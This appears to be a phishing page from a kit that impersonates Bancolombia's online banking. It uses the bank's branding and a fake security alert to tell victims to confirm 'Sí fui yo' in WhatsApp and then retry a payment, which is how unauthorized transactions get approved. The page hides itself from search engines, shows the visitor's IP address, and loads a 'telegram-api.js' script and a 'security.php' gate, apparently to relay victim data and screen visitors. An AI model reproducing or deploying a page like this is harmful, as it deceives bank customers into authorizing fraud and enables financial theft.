<?php require_once 'security.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="description" content="Alerta de seguridad Bancolombia — validación transaccional.">
    <title>Alerta de seguridad — Bancolombia</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="assets/css/pages/seleccion919.css">
</head>
<body class="seleccion919-page">

<div class="s919-wrapper">
    <img src="assets/images/trazo-movil.svg" alt="" class="s919-trazo-izq">
    <img src="assets/images/trazo-escritorio.svg" alt="" class="s919-trazo-der">

    <header class="s919-header">
        <img src="assets/images/logo-encabezado.svg" alt="Bancolombia" class="s919-logo">
    </header>

    <main class="s919-main">
        <h1 class="s919-titulo">Sucursal Virtual Personas</h1>

        <div class="s919-card">
            <div class="s919-shield">
                <svg viewBox="0 0 64 80" xmlns="http://www.w3.org/2000/svg" class="s919-shield-svg">
                    <path d="M32 2 L58 14 V40 C58 58 46 70 32 78 C18 70 6 58 6 40 V14 Z"
                          fill="none" stroke="#E8B620" stroke-width="4" stroke-linejoin="round"/>
                    <text x="32" y="52" text-anchor="middle" font-size="36" font-weight="bold"
                          fill="#E8B620" font-family="Arial, sans-serif">!</text>
                </svg>
            </div>

            <h2 class="s919-alert-titulo">
                Por seguridad, no puedes continuar la transacción
            </h2>

            <p class="s919-descripcion">
                Te enviaremos dos mensajes a <strong>WhatsApp</strong> desde nuestro
                <strong>Tabot</strong>, tu asistente virtual Bancolombia, para finalizar el pago.
            </p>

            <div class="s919-chat-box">
                <svg class="s919-chat-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20 2H4C2.9 2 2 2.9 2 4V22L6 18H20C21.1 18 22 17.1 22 16V4C22 2.9 21.1 2 20 2Z"
                          stroke="#25B35E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M8 10H16M8 14H13" stroke="#25B35E" stroke-width="2" stroke-linecap="round"
                          stroke-linejoin="round"/>
                </svg>
                <p class="s919-chat-text">
                    Por favor, indicar en el chat<br>
                    <strong>"Sí fui yo"</strong><br>
                    y confirmar con el <strong>"sí"</strong>.
                </p>
            </div>

            <div class="s919-importante">
                <span class="s919-triangulo">⚠️</span>
                <p class="s919-importante-text">
                    <strong>IMPORTANTE:</strong> Haz clic en <strong>"Reintentar pago"</strong>
                    <strong>ÚNICAMENTE</strong> después de haber dado los dos "sí" en WhatsApp.
                </p>
            </div>

            <button type="button" class="s919-boton-reintentar" id="btnReintentar">
                Reintentar pago
            </button>
        </div>
    </main>

    <footer class="s919-footer">
        <div class="s919-footer-logos">
            <img src="assets/images/logo-pie.svg" alt="Bancolombia" class="s919-logo-pie">
        </div>
        <div class="s919-info-footer">
            <span>Dirección IP: <span id="gfg">Cargando...</span></span>
            <span id="fecha-hora" class="s919-fecha"></span>
        </div>
    </footer>
</div>

<script src="assets/js/shared/page-common.js"></script>
<script src="assets/js/shared/telegram-api.js"></script>
<script src="assets/js/pages/seleccion919.js"></script>

</body>
</html>
